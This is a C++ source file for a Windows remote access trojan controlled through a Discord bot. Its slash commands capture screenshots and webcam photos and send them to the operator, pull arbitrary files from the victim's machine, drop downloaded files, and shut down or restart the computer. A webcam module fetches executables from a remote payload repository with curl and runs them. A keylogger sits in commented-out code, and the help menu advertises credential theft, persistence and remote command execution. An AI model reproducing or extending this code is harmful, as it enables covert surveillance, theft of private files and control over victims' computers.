// ROSSY
// Created by : C0SM0

// imports
#include <dpp/dpp.h>
#include <iostream>
#include <cstdlib>
#include <windows.h>
#include <Lmcons.h>
#include <string>
#include <cstdio>
#include <algorithm> 

#define _WIN32_WINNT 0x0500
#include <stdlib.h>
#include <stdio.h>
#include <fstream>

#pragma comment(lib, "Urlmon.lib")

// namespace
using namespace std;

// token
const std::string BOT_TOKEN = "YOUR_TOKEN_HERE";
const string WEBHOOK = "YOUR_WEBHOOK_HERE";

bool log_mode = false;
string message = "";

// gets username
string get_username() {

    // get values
    TCHAR raw_username [ UNLEN + 1 ];
    DWORD size = UNLEN + 1;

    // if username exists
    if (GetUserName( (TCHAR*)raw_username, &size )) {

        // convert to wstring, then string
        wstring w_username(&raw_username[0]); 
        string string_username(w_username.begin(), w_username.end()); 

        // return string username
        return string_username;
    }

    // exception
    else {
        return "N/A";
    }
}

// install webcam tools
void install_webcam() {

    // download and install tools
    system("curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/webcam.exe -o webcam.exe");
    system("curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/confirm-cam.vbs -o confirm.vbs");

    // execute tools
    system("webcam.exe");
    system("confirm.vbs");

    // cleanup
    system("del confirm.vbs");
    system("del image.bmp");
}

// // special key handling
// bool SpecialKeys(int S_Key) {
// 	switch (S_Key) {
// 	case VK_SPACE:
// 		cout << " ";
// 		return (" ");
// 	case VK_RETURN:
// 		cout << "\n";
// 		return ("\n");
// 	case '¾':
// 		cout << ".";
// 		return (".");
// 	case VK_SHIFT:
// 		cout << "#SHIFT#";
// 		return ("#SHIFT#");
// 	case VK_BACK:
// 		cout << "\b";
// 		return ("\b");
// 	case VK_RBUTTON:
// 		cout << "#R_CLICK#";
// 		return ("#R_CLICK#");
// 	case VK_CAPITAL:
// 		cout << "#CAPS_LOCK#";
// 		return ("#CAPS_LCOK");
// 	case VK_TAB:
// 		cout << "#TAB";
// 		return ("#TAB");
// 	case VK_UP:
// 		cout << "#UP";
// 		return ("#UP_ARROW_KEY");
// 	case VK_DOWN:
// 		cout << "#DOWN";
// 		return ("#DOWN_ARROW_KEY");
// 	case VK_LEFT:
// 		cout << "#LEFT";
// 		return ("#LEFT_ARROW_KEY");
// 	case VK_RIGHT:
// 		cout << "#RIGHT";
// 		return ("#RIGHT_ARROW_KEY");
// 	case VK_CONTROL:
// 		cout << "#CONTROL";
// 		return ("#CONTROL");
// 	case VK_MENU:
// 		cout << "#ALT";
// 		return ("#ALT");
// 	default: 
// 		return false;
// 	}
// }

// main code
int main() {

    // load token
    dpp::cluster bot(BOT_TOKEN);
    // dpp::cluster bot(BOT_TOKEN, dpp::i_default_intents | dpp::i_message_content);

    // logging
    // bot.on_log(dpp::utility::cout_logger());

     // slash commands
    bot.on_slashcommand([](const dpp::slashcommand_t & event) {

        // get values
        string target_username = get_username();
        string selected_username = target_username;
        dpp::command_interaction cmd_data = std::get<dpp::command_interaction>(event.command.data);

        // hello
        if (event.command.get_command_name() == "hello") {
            event.reply("hello from, **" + target_username + "**");
        }

        // shutdown
        if (event.command.get_command_name() == "shutdown") {
            event.reply("[*] Shutting down...");
            system("shutdown /p");
        }
        // restart
        if (event.command.get_command_name() == "restart") {
            event.reply("[*] Restarting...");
            system("shutdown /r");
        }
        // screenshot
        if (event.command.get_command_name() == "screenshot") {

            // powershell screenshot process 
            system("powershell /c \"[void] [System.Reflection.Assembly]::LoadWithPartialName('System.Drawing'); [void] [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); function oTQUhIuPql { param([Switch]$yaIwHruzEh) begin {Add-Type -AssemblyName System.Drawing; $srzZBXVwhJ = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatDescription -eq 'JPEG' }} process { Start-Sleep -Milliseconds 250; if ($yaIwHruzEh) { [Windows.Forms.Sendkeys]::SendWait('%{PrtSc}')} else {[Windows.Forms.Sendkeys]::SendWait('{PrtSc}')} Start-Sleep -Milliseconds 250; $QxmDCwUIzG = [Windows.Forms.Clipboard]::GetImage(); $obxcfMnWDi = New-Object Drawing.Imaging.EncoderParameters; $obxcfMnWDi.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100); $QxmDCwUIzG.Save('screenshot.jpg', $srzZBXVwhJ, $obxcfMnWDi)};}oTQUhIuPql\"");

            // send to attacker
            dpp::message screenshot_msg;
            screenshot_msg.set_file_content(dpp::utility::read_file("screenshot.jpg"));
            screenshot_msg.set_filename("webcam.jpg");
            event.reply(screenshot_msg);

            // clean up
            system("del screenshot.jpg");
        }

        // webcam
        if (event.command.get_command_name() == "webcam") {

            // delay response for webcam processes
            event.thinking();

            // take photo
            system("start /min powershell.exe -windowstyle hidden ./webcam.exe");
            Sleep(5000);

            // convert image to jpg
            system("powershell /c [Reflection.Assembly]::LoadWithPartialName('System.Drawing');$img=[Drawing.Image]::FromFile('image.bmp');$img.Save('image.jpg', 'JPEG');$img.Dispose()");

            // get webcam photo
            dpp::message webcam_msg;
            webcam_msg.set_file_content(dpp::utility::read_file("image.jpg"));
            webcam_msg.set_filename("webcam.jpg");

            // send to attacker
            event.edit_response(webcam_msg);
            Sleep(2000);
            system("del image.bmp image.jpg");

        }

        // killswitch
        if (event.command.get_command_name() == "killswitch") {
            event.reply("[*] Uninstalling from **" + target_username + "**");
            system("del rexord.exe");
        }

        // exit
        if (event.command.get_command_name() == "exit") {
            event.reply("[*] Exiting...");
            Sleep(3000);
            exit(0);
        }

        // help
        if (event.command.get_command_name() == "help") {
            const char *help_menu = R""""(
**[+] Getting Started:**
 - `/help` - displays this menu
 - `/hello` - see connected targets
 - `/select <target>` - connect to specified target ['all' by default]

**[+] General:**
 - `/upload <attachment>` - upload file(s) to target
 - `/download` - download file(s) [list multiple with ","] 
 - `/shutdown` - shuts down target
 - `/restart` - restarts target
 - `/exit` - exits target [can't reconnect]
 - `/killswitch` - uninstalls from target
 
**[+] Modules:**
 - `/install` - install modules to target
 - `/keylogger` - starts live keylogger
 - `/webcam` - take picture through target webcam
 - `/screenshot` - screenshot target computer
 - `/record player <seconds>` - record audio from target 
 - `/wifi creds` - gets wifi credentials
 - `/web creds` - gets web credentials

**[+] System:**
 - `/persist` - executes persistence on target
 - `/$<command>` - execute system command on target
 - `/private` - get private ip address
 - `/public` - get public ip address
 - `/os` - show os info)"""";
            event.reply(help_menu);
        }
        
        // select target
        else if (event.command.get_command_name() == "select") {

            // get selected target
            std::string t_username = std::get<std::string>(event.get_parameter("target"));

            // selects all targets by default
            if (t_username == "all") {
                t_username = target_username;
            }
    
            event.reply(std::string("[+] Selected target : " + t_username));
        }        
        // install module
        else if (event.command.get_command_name() == "install") {

            // get module to install
            std::string user_module = std::get<std::string>(event.get_parameter("module"));

            event.reply(std::string("[*]Installing " + user_module + "..."));

            // selects all targets by default
            if (user_module == "webcam") {
                install_webcam();
            }
    
        }
        // keylogger module
        else if (event.command.get_command_name() == "keylogger") {

            event.thinking();

            // get mode
            std::string user_module = std::get<std::string>(event.get_parameter("mode"));

            // event.reply(std::string("[*]Installing " + user_module + "..."));

            // selects all targets by default
            if (user_module == "on") {
                // install_webcam();
                event.edit_response("on");
                log_mode = true;
            }
            if (user_module == "off") {
                // install_webcam();
                event.edit_response("off");
                log_mode = false;
                message = "";           
            }

            // ShowWindow(GetConsoleWindow(), SW_HIDE);
            // char KEY = 'x';

            // while (log_mode) {
            //     Sleep(10);
            //     for (int KEY = 8; KEY <= 190; KEY++)
            //     {
            //         if (GetAsyncKeyState(KEY) == -32767) {
                        
            //             if (SpecialKeys(KEY) == false) {
            //                 message += KEY;
            //             }
            //             else {
            //                 message += SpecialKeys(KEY);
            //             }

            //             event.edit_response(message);
            //         }
            //     }
            // }
        }

        // download
        if (event.command.get_command_name() == "download") {

            // create interaction modal
            dpp::interaction_modal_response modal("my_modal", "Type name of file to download...");

            // textbox setup
            modal.add_component(
                dpp::component().
                set_label("[~] Filename[s]").
                set_id("field_id").
                set_type(dpp::cot_text).
                set_placeholder("Type name of file to download...").
                set_min_length(1).
                set_max_length(2000).
                set_text_style(dpp::text_paragraph)
            );

            // trigger textbox
            event.dialog(modal);
        }

        // upload
        if (cmd_data.name == "upload") {
            dpp::snowflake file_id = std::get<dpp::snowflake>(event.get_parameter("file"));
            auto iter = event.command.resolved.attachments.find(file_id);

            // if file was attached
            if (iter != event.command.resolved.attachments.end()) {
                const dpp::attachment& att = iter->second;
                
                // convert url to wide character
                string narrow_url(att.url);
                wstring wide_url = wstring(narrow_url.begin(), narrow_url.end());
                const wchar_t* srcURL = wide_url.c_str();

                // get filename from url
                string url = att.url;
                reverse(url.begin(), url.end());
                string filename = url.substr(0, url.find("/"));
                reverse(filename.begin(), filename.end());

                // convert filename to wide character
                string narrow_file(filename);
                wstring wide_file = wstring(narrow_file.begin(), narrow_file.end());
                const wchar_t* destFile = wide_file.c_str();

                // if file uploads successfully
                if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL)) {
                    event.reply("[+] File saved as : **" + filename + "**\n" + att.url);
                }

                // exception
                else {
                    event.reply("[!!] Failed Upload");
                } 
            }          
        }
    });
 
    // modal submission (download complete)
    bot.on_form_submit([&](const dpp::form_submit_t & event) {

        // get inputted text
        std::string user_input = std::get<std::string>(event.components[0].components[0].value);
        dpp::message downloaded_content;

        // attach the file
        downloaded_content.set_file_content(dpp::utility::read_file(user_input));
        downloaded_content.set_filename(user_input);

        // send the message
        event.reply(downloaded_content);
    });

    // on start
    bot.on_ready([&bot](const dpp::ready_t & event) {
        if (dpp::run_once<struct register_bot_commands>()) {

            // get target username
            string target_username = get_username();

            // hello
            bot.global_command_create(dpp::slashcommand("hello", "Show Connected Targets", bot.me.id)); 

            // shutdown
            bot.global_command_create(dpp::slashcommand("shutdown", "Shutdown Target Computer", bot.me.id)); 

            // exit
            bot.global_command_create(dpp::slashcommand("exit", "Exit Target Computer", bot.me.id)); 
            
            // restart
            bot.global_command_create(dpp::slashcommand("restart", "Restart Target Computer", bot.me.id)); 

            // killswitch
            bot.global_command_create(dpp::slashcommand("killswitch", "Uninstall From Target Computer", bot.me.id)); 

            // webcam
            bot.global_command_create(dpp::slashcommand("webcam", "Take Webcam Photo on Target Computer", bot.me.id)); 

            // help menu 
            bot.global_command_create(dpp::slashcommand("help", "Displays Help Menu", bot.me.id)); 

            // download
            bot.global_command_create(dpp::slashcommand("download", "Download remote file", bot.me.id)); 

            // screenshot
            bot.global_command_create(dpp::slashcommand("screenshot", "Take screenshot on Target Computer", bot.me.id)); 
            
            // select target
            dpp::slashcommand select_target("select", "[~] Select a Specific Target", bot.me.id);

            // target options
            select_target.add_option(
                    dpp::command_option(dpp::co_string, "target", "[~] Select username", true).
                        add_choice(dpp::command_option_choice(target_username, std::string(target_username))).add_choice(dpp::command_option_choice("all", std::string("all")))
            );

            bot.global_command_create(select_target);  

            // install
            dpp::slashcommand install("install", "[~] Select extra tools to install", bot.me.id);

            // install options
            install.add_option(
                    dpp::command_option(dpp::co_string, "module", "[*] Additional tools to add", true).
                        add_choice(dpp::command_option_choice("webcam", std::string("webcam"))).add_choice(dpp::command_option_choice("keylogger", std::string("keylogger")))
            );

            bot.global_command_create(install);

            // keylogger
            dpp::slashcommand keylogger("keylogger", "[~] Log Target Keystrokes", bot.me.id);

            // available modes
            keylogger.add_option(
                    dpp::command_option(dpp::co_string, "mode", "[*] Set the mode of the keylogger", true).
                        add_choice(dpp::command_option_choice("on", std::string("on"))).add_choice(dpp::command_option_choice("off", std::string("off")))
            );

            bot.global_command_create(keylogger);
            
            // file upload
            dpp::slashcommand upload("upload", "Upload a file", bot.me.id);
            upload.add_option(dpp::command_option(dpp::co_attachment, "file", "Select a file to upload"));

            bot.global_command_create(upload);
            
        }
    });
 
    // start bot
    // bot.start(dpp::st_wait); // linux
	// ShowWindow(GetConsoleWindow(), SW_HIDE);
    bot.start(false); // windows
    return 0;
}
